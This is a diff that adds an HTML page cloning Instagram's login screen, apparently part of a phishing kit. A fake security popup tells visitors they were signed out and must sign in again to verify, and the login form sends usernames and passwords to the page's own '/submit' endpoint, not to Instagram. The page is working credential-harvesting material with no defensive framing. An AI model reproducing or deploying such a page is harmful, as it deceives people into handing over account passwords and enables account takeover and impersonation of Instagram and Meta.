@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../assets/css/main.css">
+    
+  <title>Instagram</title>
+  <link rel="icon" href="../assets/img/icon.ico" type="image/x-icon">
+</head>
+<div class="popup-overlay" id="popup">
+  <div class="popup-content">
+   
+    <p>Your have been temporarily Signed Out of Instagram for security reasons, Please Sign In again to Verify!</p>
+    <button id="closebtn" onclick="closePopup()">Ok</button>
+  </div>
+</div>
+<body>
+  
+  <main class="l-main">
+      <div class="l-main__img">
+        <img id="bgimg" src="../assets/img/IGBG.png" alt="Smartphones">
+      </div>
+      <div class="l-user">
+        <div class="c-panel group">
+          <img class="c-panel__img" src="../assets/img/instagram.svg" alt="Instagram">
+          <div id="wrongmsg"></div>
+          <div class="c-panel__form">
+            <form id="form" action="/submit" method="POST">
+              <input id="email" name="email" type="text" class="c-panel__input" placeholder="Phone number, username, or email" required>
+              <br><input id="pass" name="pass" type="password" class="c-panel__input" placeholder="Password" required>
+              <br><button id="submit" class="c-btn" type="submit">Log In</button>
+            </form>
+            <span class="c-panel__span">OR</span>
+          </div>
+          <img id="facebook" class="c-panel__img" src="../assets/img/Facebook_Logo_2023.png" alt="Facebook">
+          <a href="#" id="fbup" class="c-panel__facebook">Login with Facebook</a>
+          <a href="#" id="fpassword" class="c-panel__forgot">Forgot password?</a>
+        </div>
+        <div class="c-signup group">
+          <p>Don't have an account? <a href="#" id="signup">Sign up</a></p>
+        </div>
+        <div class="c-app">
+          <p>Get the app.</p>
+          <div class="c-app__download">
+            <img src="../assets/img/apple.png" alt="Apple Store">
+            <img src="../assets/img/google.png" alt="Google Play">
+          </div>
+        </div>
+      </div>
+      <div class="container">
+        <div class="sub-container">
+            <div class="content-wrapper">
+                <div class="link-item">
+                    <a href="https://about.meta.com/" target="_blank" rel="nofollow noopener noreferrer">Meta</a>
+                </div>
+                <div class="link-item">
+                    <a href="https://about.instagram.com/" target="_blank" rel="nofollow noopener noreferrer">About</a>
+                </div>
+                <div class="link-item">
+                    <a href="https://about.instagram.com/blog/" target="_blank" rel="nofollow noopener noreferrer">Blog</a>
+                </div>
+                <div class="link-item">
+                    <a id="egg" href="https://about.instagram.com/about-us/careers" target="_blank" rel="nofollow noopener noreferrer">Jobs</a>
+                </div>
+                <div class="link-item">
+                    <a href="https://help.instagram.com/" target="_blank" rel="nofollow noopener noreferrer">Help</a>
+                </div>
+                <div class="link-item">
+                    <a href="https://developers.facebook.com/docs/instagram" target="_blank" rel="nofollow noopener noreferrer">API</a>
+                </div>
+                <div class="link-item">
+                    <a href="/legal/privacy/" tabindex="0">Privacy</a>
+                </div>
+                <div class="link-item">
+                    <a href="/legal/terms/" tabindex="0">Terms</a>
+                </div>
+                <div class="link-item">
+                    <a href="/explore/locations/" tabindex="0">Locations</a>
+                </div>
+                <div class="link-item">
+                    <a href="/web/lite/" tabindex="0">Instagram Lite</a>
+                </div>
+                <div class="link-item">
+                    <a href="/threads/" tabindex="0">Threads</a>
+                </div>
+                <div class="link-item">
+                    <a href="#" tabindex="0">Contact Uploading & Non-Users</a>
+                </div>
+                <div class="link-item">
+                    <a href="#" tabindex="0">Meta Verified</a>
+                </div>
+            </div>
+            <br>
+            <div class="mobile-agreement mobile-only">
+                <p>
+                    By continuing, you agree to Instagram's 
+                    <a href="/legal/terms/" tabindex="0">Terms of Use</a> and 
+                    <a href="/legal/privacy/" tabindex="0">Privacy Policy</a>.
+                </p>
+            </div>
+            <div class="footer-meta desktop-only">
+              <br>
+              <span>English</span>
+              <span>© 2025 Instagram</span>
+            </div>
+            <div id="metathing" class="footer-meta mobile-only">
+              <br>
+              <span>From</span><br>
+              <span><img width="20px" height="10px" src="../assets/img/meta-color.png" alt="Meta logo" class="meta-logo"><img><i style="position: relative;top:-5px;">Meta</i></span>
+              
+              <br><br>
+            </div>
+        </div>
+        </div>
+      </div>
+    
+  </main>
+  
+  <script src="../assets/scripts/script.js"></script>
+</body>
+</html>
